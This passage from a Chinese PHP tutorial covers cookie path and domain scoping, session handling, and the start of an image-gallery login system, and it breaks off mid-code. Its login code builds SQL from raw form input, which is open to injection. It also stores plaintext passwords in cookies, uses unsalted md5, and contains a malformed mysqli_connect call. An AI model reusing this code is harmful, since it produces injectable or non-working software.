说明：由于浏览器每次请求时，携带到服务器端很多的COOKIE数据，会导致请求数据变得庞大；将COOKIE划分到各个路径中，减少每个路径下COOKIE的数量。</p><p><code>例如：京东保存在客户端的有1万个COOKIE数据，大小为100MB，每次请求都需要1个小时。这样一来，每次请求带1个万COOKIE，但是当前页码只使用2个COOKIE，造成带宽浪费。</code></p><p><code>解决方案是：请求页面需要什么COOKIE，就带什么COOKIE过去，有针对性，会节省宽带。</code></p><p>setcookie.php</p><p>设置cookie只在某一文件下才有效。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//添加COOKIE数据</span></span><br><span class="line">setcookie(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;admin&quot;</span>,time()+<span class="number">7</span>*<span class="number">24</span>*<span class="number">3600</span>,<span class="string">&#x27;/steady&#x27;</span>);</span><br><span class="line">setcookie(<span class="string">&quot;password&quot;</span>,<span class="string">&quot;123456&quot;</span>,time()+<span class="number">7</span>*<span class="number">24</span>*<span class="number">3600</span>,<span class="string">&#x27;/steady&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>getcookie.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//获取COOKIE中用户名和密码</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;用户名：&quot;</span>.$_COOKIE[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;密码：&quot;</span>.$_COOKIE[<span class="string">&#x27;password&#x27;</span>].<span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//打印$_COOKIE全局数组</span></span><br><span class="line">print_r($_COOKIE);</span><br></pre></td></tr></table></figure><p>首先获取cookie</p><p><code>http://127.0.0.1:8888/php/setcookie.php</code></p><p>然后访问别的页面查看是否有cookie输出</p><p><code>http://127.0.0.1:8888/php/getcookie.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用户名：</span><br><span class="line">密码：</span><br><span class="line">Array ( )</span><br></pre></td></tr></table></figure><p>访问指定的页面</p><p><code>http://127.0.0.1:8888/steady/getcookie.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用户名：admin</span><br><span class="line">密码：123456</span><br><span class="line">Array ( [username] &#x3D;&gt; admin [password] &#x3D;&gt; 123456 )</span><br></pre></td></tr></table></figure><h4 id="COOKIE域名有效性"><a href="#COOKIE域名有效性" class="headerlink" title="COOKIE域名有效性"></a>COOKIE域名有效性</h4><p>描述：给一个COOKIE指定访问的域名</p><p>语法：<code>bool setcookie ( string $name [, string $value [, int $expire = 0 [, string $path [, string $domain]]]] )</code></p><p>提示：默认情况下，cookie只能在当前域名下有效。</p><p>域名划分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">主域名：itcast.cn</span><br><span class="line"></span><br><span class="line">一级域名：www.itcast.cn</span><br><span class="line"></span><br><span class="line">二级域名：news.itcast.cn</span><br><span class="line"></span><br><span class="line">三级域名：php.news.itcast.cn</span><br></pre></td></tr></table></figure><p>说明：如果COOKIE域名有效性，设置为主域名，则在所有域名下都可以使用。如果设置为子域名，则只能在子域名下使用该COOKIE。</p><h4 id="是否仅https安全连接才能发送cookie呢？"><a href="#是否仅https安全连接才能发送cookie呢？" class="headerlink" title="是否仅https安全连接才能发送cookie呢？"></a>是否仅https安全连接才能发送cookie呢？</h4><p>描述：是否仅限https来发送COOKIE数据，默认情况下，为http协议发送；</p><p>语法：<code>bool setcookie ( string $name [, string $value [, int $expire = 0 [, string $path [, string $domain [, bool $secure = false]]]]] )</code></p><p>https：是以安全为目标的HTTP通道，简单讲是HTTP的安全版。即HTTP下加入SSL层，HTTPS的安全基础是SSL，因此加密的详细内容就需要SSL 。</p><h4 id="是否只能通过http协议来使用COOKIE呢？"><a href="#是否只能通过http协议来使用COOKIE呢？" class="headerlink" title="是否只能通过http协议来使用COOKIE呢？"></a>是否只能通过http协议来使用COOKIE呢？</h4><p>描述：客户端的COOKIE除了可以通过HTTP协议来使用外，还可以使用JS来使用COOKIE。</p><p>语法：<code>bool setcookie ( string $name [, string $value [, int $expire = 0 [, string $path [, string $domain [, bool $secure = false [, bool $httponly = false ]]]]]] )</code></p><h3 id="SESSION概述"><a href="#SESSION概述" class="headerlink" title="SESSION概述"></a>SESSION概述</h3><h4 id="什么是SESSION？"><a href="#什么是SESSION？" class="headerlink" title="什么是SESSION？"></a>什么是SESSION？</h4><p>Session对象存储特定用户的会话数据；</p><p>Session将会话数据存储在服务器端；</p><p>Session是基于Cookie技术的，没有Cookie就没有Session；</p><p>Session在整个用户会话中，一直存在下去；</p><p>一个用户会话时效：从用户登录开始，到用户登录结束；</p><p>Session存储的数据量要比cookie大的多；</p><p>Session存储的内容类型，不限于字符串；</p><p>Session数据存储在服务器端，更安全，可靠。</p><h5 id="开启SESSION会话功能"><a href="#开启SESSION会话功能" class="headerlink" title="开启SESSION会话功能"></a>开启SESSION会话功能</h5><p>ü 描述：启动新会话或者重用现有会话 ；</p><p>语法：<code>bool session_start (void )</code></p><p>提示：$_SESSION变量默认是不存在的，与$_POST、$_GET、$_FILES不一样。因此，必须先开启SESSION，才能使用$_SESSION变量；</p><p>提示：每个需要SESSION数据的页面，都要开启SESSION功能；</p><p>注意：SESSION功能，不能重复开启(同一个页面不能开2次)；</p><p>返回：成功开始会话返回 TRUE ，反之返回 FALSE；</p><h4 id="SESSION操作"><a href="#SESSION操作" class="headerlink" title="SESSION操作"></a>SESSION操作</h4><h5 id="添加SESSION数据"><a href="#添加SESSION数据" class="headerlink" title="添加SESSION数据"></a>添加SESSION数据</h5><p>描述：对Session的管理(增删改查)，都是通过超全局数组<code>$_SESSION</code>进行的；</p><p>语法：<code>$_SESSION[key] = value</code></p><p>提示：一个网站不管添加多少个SESSION数据，最终在浏览器端只存储一个SESSION的ID值，该ID值是经过加密的，并且永不重复。Key只能是String类型的数据。</p><p>SESSION文件在服务器端的存储位置：c:\windows\temp，查看session的文件存储位置，在phpinfo中查看<code>session.save_path</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;开启SESSION会话</span><br><span class="line">&#x2F;&#x2F;产生新的SessionID或重用传递过来的SessionID</span><br><span class="line">&#x2F;&#x2F;产生SessionID，并创建对应的Session文件</span><br><span class="line">session_start();</span><br><span class="line">&#x2F;&#x2F;添加SESSION数据</span><br><span class="line">$_SESSION[&#39;username&#39;] &#x3D; &quot;admin&quot;;</span><br><span class="line">$_SESSION[&#39;password&#39;] &#x3D; &quot;123456&quot;;</span><br></pre></td></tr></table></figure><h5 id="读取SESSION数据"><a href="#读取SESSION数据" class="headerlink" title="读取SESSION数据"></a>读取SESSION数据</h5><p>语法：<code>$value = $_SESSION[key]</code></p><p>提示：每次SESSION操作，都要先开SESSION功能；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;开启SESSION会话</span><br><span class="line">session_start();</span><br><span class="line">&#x2F;&#x2F;读取SESSION数据</span><br><span class="line">echo &quot;用户名：&quot;.$_SESSION[&#39;username&#39;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;密码：&quot;.$_SESSION[&#39;password&#39;].&quot;&lt;hr&gt;&quot;;</span><br><span class="line">&#x2F;&#x2F;打印$_SESSION数组</span><br><span class="line">print_r($_SESSION);</span><br></pre></td></tr></table></figure><h5 id="删除SESSION数据"><a href="#删除SESSION数据" class="headerlink" title="删除SESSION数据"></a>删除SESSION数据</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;开启SESSION会话</span><br><span class="line">session_start();</span><br><span class="line">&#x2F;&#x2F;删除SESSION数据：也包括删除内存中的SESSION数据</span><br><span class="line">unset($_SESSION[&#39;username&#39;]);</span><br><span class="line">unset($_SESSION[&#39;password&#39;]);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;删除SESSION文件</span><br><span class="line">session_destroy();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;删除对应的SessID</span><br><span class="line">setcookie(&quot;PHPSESSID&quot;,false);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;打印$_SESSION数组</span><br><span class="line">print_r($_SESSION);</span><br></pre></td></tr></table></figure><h2 id="图片管理系统"><a href="#图片管理系统" class="headerlink" title="图片管理系统"></a>图片管理系统</h2><h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><h4 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create database if not exists image charset utf8;</span><br></pre></td></tr></table></figure><h4 id="创建用户表"><a href="#创建用户表" class="headerlink" title="创建用户表"></a>创建用户表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create table if not exists user(</span><br><span class="line">    -&gt; id int not null auto_increment primary key,</span><br><span class="line">    -&gt; username varchar(20),</span><br><span class="line">    -&gt; password char(32)</span><br><span class="line">    -&gt; )engine&#x3D;InnoDB;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into user(username,password) values(&quot;admin&quot;,&quot;admin&quot;);</span><br></pre></td></tr></table></figure><h4 id="创建相册数据库"><a href="#创建相册数据库" class="headerlink" title="创建相册数据库"></a>创建相册数据库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create table if not exists photos(</span><br><span class="line">    -&gt; id int not null auto_increment primary key,</span><br><span class="line">    -&gt; title varchar(20),</span><br><span class="line">    -&gt; imgsrc varchar(100),</span><br><span class="line">    -&gt; intro text,</span><br><span class="line">    -&gt; hits int not null default 0,</span><br><span class="line">    -&gt; addate int(10)</span><br><span class="line">    -&gt; )engine&#x3D;InnoDB;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br></pre></td></tr></table></figure><h3 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h3><h4 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h4><ul><li>用户登录之后，具有上传功能。</li><li>上传图片功能。</li><li>显示图片信息功能。</li></ul><h4 id="整体结构"><a href="#整体结构" class="headerlink" title="整体结构"></a>整体结构</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  xiangmu tree</span><br><span class="line">.</span><br><span class="line">├── app.php</span><br><span class="line">├── captcha.php</span><br><span class="line">├── conn.php</span><br><span class="line">├── detail.php</span><br><span class="line">├── index.php</span><br><span class="line">├── login.php</span><br><span class="line">├── loginSave.php</span><br><span class="line">├── upload.php</span><br><span class="line">└── uploadSave.php</span><br><span class="line"></span><br><span class="line"><span class="number">0</span> directories, <span class="number">9</span> files</span><br></pre></td></tr></table></figure><h4 id="数据库-1"><a href="#数据库-1" class="headerlink" title="数据库"></a>数据库</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$db_name=<span class="string">&quot;image&quot;</span>;</span><br><span class="line">$db_port=<span class="string">&quot;3306&quot;</span>;</span><br><span class="line">$db_host=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">$db_user=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">$db_password=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">$bd_charset=<span class="string">&quot;utf-8&quot;</span>;</span><br><span class="line">$link=@mysqli_connect($db_host.<span class="string">&quot;:&quot;</span>.$db_port.$db_name,$db_password);</span><br><span class="line"><span class="keyword">if</span>(!$link)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;数据库连接失败。&quot;</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!mysqli_select_db($link,$db_name))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;数据库<span class="subst">&#123;$db_name&#125;</span>连接失败。&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysqli_set_charset($link,$bd_charset);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="登录功能"><a href="#登录功能" class="headerlink" title="登录功能"></a>登录功能</h4><p>提交表单给登录文件，登录文件判断提交的数据–用户名、密码、验证码是否合法。如果合法进入文件上传界面，如果不合法继续进入登录界面。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">&#x27;token&#x27;</span>]=uniqid();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;用户登录&lt;/title&gt;</span><br><span class="line">&lt;style type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line"><span class="comment">/*全局样式*/</span></span><br><span class="line">body,h2,form,a&#123;margin:<span class="number">0</span>px;padding:<span class="number">0</span>px&#125;</span><br><span class="line">body&#123;font-size:<span class="number">14</span>px;color:<span class="comment">#444;background-color:#00343f;&#125;</span></span><br><span class="line">a&#123;text-decoration:none;color:<span class="comment">#444;&#125;</span></span><br><span class="line">a:hover&#123;color:red;&#125; </span><br><span class="line"><span class="comment">/*局部样式*/</span></span><br><span class="line">.box&#123;width:<span class="number">1000</span>px;margin:<span class="number">0</span>px auto;background-color:white;&#125;</span><br><span class="line">.title&#123;</span><br><span class="line">text-align:center;</span><br><span class="line">padding: <span class="number">10</span>px <span class="number">0</span>px;</span><br><span class="line">border-bottom: <span class="number">2</span>px solid <span class="comment">#444;</span></span><br><span class="line">background-color:<span class="comment">#d0e9ff;</span></span><br><span class="line">&#125;</span><br><span class="line">.title h2&#123;font-size:<span class="number">36</span>px;padding:<span class="number">10</span>px;&#125;</span><br><span class="line">form&#123;padding:<span class="number">30</span>px;height:<span class="number">400</span>px;&#125;</span><br><span class="line">form td&#123;padding:<span class="number">8</span>px;&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class=&quot;box&quot;&gt;</span><br><span class="line">&lt;!--title--&gt;</span><br><span class="line">&lt;div class=&quot;title&quot;&gt;</span><br><span class="line">&lt;h2&gt;用户登录&lt;/h2&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;javascript:void(0)&quot;</span>&gt;欢迎光临，请先登录！&lt;/a&gt;</span><br><span class="line">&lt;/div&gt;&lt;!--<span class="comment">//title--&gt;</span></span><br><span class="line">&lt;!--form--&gt;</span><br><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;loginSave.php&quot;</span>&gt;</span><br><span class="line">&lt;table align=<span class="string">&quot;center&quot;</span> width=<span class="string">&quot;400&quot;</span>&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td width=<span class="string">&quot;100&quot;</span> align=<span class="string">&quot;right&quot;</span>&gt;用户名：&lt;/td&gt;</span><br><span class="line">&lt;td&gt;&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt;&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td align=<span class="string">&quot;right&quot;</span>&gt;密&amp;nbsp;&amp;nbsp;&amp;nbsp;码：&lt;/td&gt;</span><br><span class="line">&lt;td&gt;&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span>&gt;&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td align=<span class="string">&quot;right&quot;</span>&gt;验证码：&lt;/td&gt;</span><br><span class="line">&lt;td&gt;</span><br><span class="line">&lt;input style=<span class="string">&quot;float:left;&quot;</span> type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;verify&quot;</span> size=<span class="string">&quot;4&quot;</span> maxlength=<span class="string">&quot;4&quot;</span>&gt;</span><br><span class="line">&lt;img style=<span class="string">&quot;float:left;margin-left:10px;cursor: pointer;height:22px;&quot;</span> src=<span class="string">&quot;./captcha.php&quot;</span> onClick=<span class="string">&quot;this.src=&#x27;./captcha.php?&#x27;+Math.random()&quot;</span>&gt;</span><br><span class="line">&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td&gt;&lt;/td&gt;</span><br><span class="line">&lt;td&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;登录&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;token&quot;</span> value=<span class="string">&quot;&lt;?php echo <span class="subst">$_SESSION</span>[&#x27;token&#x27;]?&gt;&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;reset&quot;</span> value=<span class="string">&quot;重置&quot;</span>&gt;</span><br><span class="line">&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line">&lt;/form&gt;&lt;!--<span class="comment">//form--&gt;</span></span><br><span class="line">&lt;/div&gt;&lt;!--<span class="comment">//box--&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//开启SESSION会话</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="comment">//产生表单验证随机字符串</span></span><br><span class="line">$_SESSION[<span class="string">&#x27;token&#x27;</span>] = uniqid();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>表单提交位置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;loginSave.php&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>表单随机验证</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;token&quot;</span> value=<span class="string">&quot;&lt;?php echo <span class="subst">$_SESSION</span>[&#x27;token&#x27;]?&gt;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>登录验证页面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//包含连接数据库的公共文件</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./conn.php&quot;</span>);</span><br><span class="line"><span class="comment">//开启SESSION会话</span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断表单是否合法提交</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;token&#x27;</span>]) &amp;&amp; $_POST[<span class="string">&#x27;token&#x27;</span>]==$_SESSION[<span class="string">&#x27;token&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//获取表单提交数据</span></span><br><span class="line">$username = $_POST[<span class="string">&#x27;username&#x27;</span>]; <span class="comment">//用户名</span></span><br><span class="line">$password = md5($_POST[<span class="string">&#x27;password&#x27;</span>]); <span class="comment">//加密字符串</span></span><br><span class="line">$verify  = $_POST[<span class="string">&#x27;verify&#x27;</span>]; <span class="comment">//验证码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//判断验证码与服务器保存的是否一致：验证码不区分大小写</span></span><br><span class="line"><span class="keyword">if</span>(strtolower($verify) != $_SESSION[<span class="string">&#x27;captcha&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;两次输入的验证码不一致！&lt;/h2&gt;&quot;</span>;</span><br><span class="line">header(<span class="string">&quot;refresh:3;url=./login.php&quot;</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断用户名和密码与数据库是否一致</span></span><br><span class="line">$sql = <span class="string">&quot;SELECT * FROM user WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line">$result = mysqli_query($link, $sql); <span class="comment">//执行SQL语句，并返回结果集对象</span></span><br><span class="line">$records = mysqli_num_rows($result); <span class="comment">//取回记录数：0没找到，1找到了</span></span><br><span class="line"><span class="keyword">if</span>(!$records)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;用户名或密码不正确！&lt;/h2&gt;&quot;</span>;</span><br><span class="line">header(<span class="string">&quot;refresh:3;url=./login.php&quot;</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//保存用户信息到SESSION中</span></span><br><span class="line">$_SESSION[<span class="string">&#x27;username&#x27;</span>] = $username;</span><br><span class="line"></span><br><span class="line"><span class="comment">//跳转到相册首页</span></span><br><span class="line">header(<span class="string">&quot;location:./index.php&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//直接跳转到login.php</span></span><br><span class="line">header(<span class="string">&quot;location:./login.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="后台文件上传功能"><a href="#后台文件上传功能" class="headerlink" title="后台文件上传功能"></a>后台文件上传功能</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//包含连接数据库的公共文件</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./conn.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//开启SESSION会话</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="comment">//判断用户是否登录</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_SESSION[<span 